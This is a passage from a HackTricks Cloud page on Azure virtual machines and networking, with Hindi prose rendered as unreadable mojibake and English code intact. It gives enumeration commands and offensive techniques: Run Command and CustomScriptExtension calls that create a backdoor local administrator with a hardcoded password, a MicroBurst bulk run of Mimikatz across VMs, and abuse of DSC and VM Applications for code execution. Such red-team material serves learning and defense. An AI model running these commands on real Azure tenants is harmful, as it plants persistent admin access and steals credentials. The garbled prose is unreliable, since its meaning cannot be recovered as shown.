# Az - рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдПрдЬрд╝реНрдпреВрд░ рдХреА рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреА [рдСрди-рдбрд┐рдорд╛рдВрдб, рд╕реНрдХреЗрд▓реЗрдмрд▓ рдХрдВрдкреНрдпреВрдЯрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрдиреЛрдВ](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдк рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдЖрдкрдХреЛ рдЕрдиреНрдп рд╡рд┐рдХрд▓реНрдкреЛрдВ рд╕реЗ рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рдЪрд╛рд╣рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА рдХрд┐ рдЖрдкрдХреЛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдмрдирд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреНрдпрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдХреИрд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕реЗ рдХреИрд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## рдПрдЬрд╝реНрдпреВрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдирдХрд╛рд░реА

рдПрдЬрд╝реНрдпреВрд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ **рд╡рд┐рднрд┐рдиреНрди рдПрдВрдЯрд┐рдЯреА рдФрд░ рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реЛрддреЗ рд╣реИрдВред** рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдПрдЬрд╝реНрдпреВрд░ рдиреЗрдЯрд╡рд░реНрдХ рдПрдВрдЯрд┐рдЯреА рдХреЗ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд **рд╡рд┐рд╡рд░рдг,** **рдЙрджрд╛рд╣рд░рдг** рдФрд░ **рдЬрд╛рдВрдЪ** рдХрдорд╛рдВрдбреНрд╕ рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## рдПрдЬрд╝реНрдпреВрд░ рдмрд╛рд╕реНрдЯрд┐рдпрди

**рдПрдЬрд╝реНрдпреВрд░ рдмрд╛рд╕реНрдЯрд┐рдпрди** рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд, рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдЖрд░рдбреАрдкреА (рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рдФрд░ рдПрд╕рдПрд╕рдПрдЪ (рд╕реБрд░рдХреНрд╖рд┐рдд рд╢реИрд▓) рдПрдХреНрд╕реЗрд╕ рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдЬрд╝реНрдпреВрд░ рдкреЛрд░реНрдЯрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрд╕рдПрд╕рдПрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рдПрдХреАрдХреГрдд рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрд░рдбреАрдкреА рдФрд░ рдПрд╕рдПрд╕рдПрдЪ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХреЛ рд╡реАрдПрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдЬреА рдЖрдИрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╡реАрдПрдо рдПрдХреНрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рджреВрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдпрд╣ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд, рдЕрдзрд┐рдХ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рд╡рд┐рдХрд▓реНрдк рдмрди рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡реАрдПрдо рдПрдХреНрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЖрдИрдкреА рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдФрд░ рдПрдирдПрд╕рдЬреА рдирд┐рдпрдо рд╡рд┐рдиреНрдпрд╛рд╕ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдбреЗрд╡рд▓рдкрд░реНрд╕ рдФрд░ рдЖрдИрдЯреА рдХрд░реНрдордЪрд╛рд░реА рдЕрдкрдиреЗ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдЬрд╝реНрдпреВрд░ рдкреЛрд░реНрдЯрд▓ рд╕реЗ рд╡реАрдПрдореНрд╕ рддрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд╡рд┐рдХрд╛рд╕ рдФрд░ рдкрд░реАрдХреНрд╖рдг рдкрд░рд┐рд╡реЗрд╢ рдХреЗ рд▓рд┐рдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реБрдЧрдо рдмрдирд╛рддреЗ рд╣реИрдВред

рдЕрдкрдиреЗ рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдореЗрдВ рд╕рднреА рдПрдЬрд╝реНрдпреВрд░ рдмрд╛рд╕реНрдЯрд┐рдпрди рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рд╕реВрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM рдЬрд╛рдВрдЪ
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **рд╡реАрдПрдо рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ**

### **рд╡реАрдПрдо рдореЗрдВ AAD рд▓реЙрдЧрд┐рди**

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ AzureAD рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд▓рд┐рдирдХреНрд╕ рд╡реАрдПрдо** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: `ssh username@azure-corp.com@1.1.1.1` (рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдПрдЬрд╝рд░рдХреЙрд░реНрдк рдХреЗ рдИрдореЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ **рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ**) рддреЛ рдЖрдкрдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

рдХреЗрд╡рд▓ **рдЙрди рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рдЬреЛ [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) рдкрд░ рдЬрд╛рдХрд░ рдХреЛрдб рдХреЛ рджрд░реНрдЬ рдХрд░реЗрдВ, рдИрдореЗрд▓ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░реЗрдВ рдФрд░ рдЖрдк SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВрдЧреЗ (рдпрджрд┐ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ: `Virtual Machine Administrator Login` рдпрд╛ `Virtual Machine User Login` рднреВрдорд┐рдХрд╛).

### **рд░рди рдХрдорд╛рдВрдб**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' тАУVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' тАУVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **рдХрд╕реНрдЯрдо рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЪрд▓рд╛рдПрдВ**

рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди (VM) рдПрдХреНрд╕рдЯреЗрдВрд╢рди **рдЫреЛрдЯреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рд╣реИрдВ рдЬреЛ **рдПрдЬрд╝реНрдпреВрд░ VMs** рдкрд░ **рдкреЛрд╕реНрдЯ-рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдФрд░ рдСрдЯреЛрдореЗрд╢рди **рдХрд╛рд░реНрдп** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдХрд┐рд╕реА рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХреЛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди, рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реБрд░рдХреНрд╖рд╛, рдпрд╛ рдЙрд╕рдХреЗ рдЕрдВрджрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдПрдХ VM рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ рдЖрдк рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХреЛрдб рдХреЛ рдирд┐рд╖реЗрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### рд╡рд╛рдВрдЫрд┐рддрдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдирд╕реНрдерд┐рддрд┐ (DSC)

рд╡рд╛рдВрдЫрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдерд┐рддрд┐ (DSC) рдПрдХ PowerShell рдЯреВрд▓ рд╣реИ рдЬреЛ Ansible рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред DSC Azure рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдПрдХ рд╕рдЦреНрдд рд╕рдВрдпрдВрддреНрд░ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, Azure рдореЗрдВ DSC рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХреБрдЫ рдлрд╝реЙрд░реНрдореЗрдЯрд┐рдВрдЧ рдорд╛рдирджрдВрдбреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддреА рд╣реИрдВ, рднрд▓реЗ рд╣реА рд╕рд┐рдВрдЯреИрдХреНрд╕ DSC рдорд╛рдирдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣реА рди рд╣реЛ, рдЬреИрд╕рд╛ рдХрд┐ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЖрдХрд╛рд░ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЗрди рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдЖрдпрд╛рдо [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) рдлрд╝рдВрдХреНрд╢рди рдЖрдЬрд╝ рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рдПрдХ **.PS1** рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╣реЛ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ **.zip** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬрд╝рд┐рдк рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд┐рдВрдЯреИрдХреНрд╕ DSC рдХреЗ рд▓рд┐рдП рд╕рд╣реА рди рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдХреЛрдб рдлрд┐рд░ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирд┐рд╖реНрдкрд╛рджрди рд╕реНрдерд┐рддрд┐ рдХреЛ "рд╡рд┐рдлрд▓рддрд╛" рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдорд╛рдВрдб рд╕реЗ рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдерд┐рддрд┐ рд╡рд┐рдлрд▓рддрд╛ рд╕рдВрджреЗрд╢ рджреНрд╡рд╛рд░рд╛ рдЕрдзрд┐рд▓рд┐рдЦрд┐рдд рд╣реЛ рдЬрд╛рдПрдЧреАред

### VM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ

VM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ рдПрдХ Azure VM рдкрд░ рд╕рдВрд╕реНрдХрд░рдгрд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рджреЛрд╣рд░рд╛рд╡реА рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИрдВред рдпрд╣ рд╕рдВрд╕рд╛рдзрди VMs рдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХрд╛ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдФрд░ рдЕрдкрдбреЗрдЯ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрдИ рдХрджрдо рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ **`New-AzGalleryApplication`** рдФрд░ **`New-AzGalleryApplicationVersion`** рдЬреИрд╕реЗ рдХрдорд╛рдВрдбреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЖрдЬрд╝ рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЗрдВред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ **"VMAppExtension"** рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ VM рдкрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ URI рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдирд╛рдорд┐рдд рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдмрд┐рдирд╛ред рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, REST API рдХреЙрд▓ рдореЗрдВ "ManageActions" рдлрд╝реАрд▓реНрдб рдХреЛ рдЙрдЪрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕ рд╡рд┐рдзрд┐ рдХреА рд╕реНрдерд╛рдкрдирд╛, рдПрдХ рдмрд╛рд░ рдкреВрд░реА рд╣реЛрдиреЗ рдкрд░, рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЖрдХрд╛рд░ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рд╡рд┐рдзрд┐ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдзреАрдореА рд╣реИ, рд▓рдЧрднрдЧ 3-4 рдорд┐рдирдЯ рд▓рдЧрддреЗ рд╣реИрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рд╡рд┐рд╢реЗрд╖ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЙрдкреА рдХреЗ рд▓рд┐рдП рдФрд░ `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` рдирд┐рд╖реНрдкрд╛рджрди рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП)ред

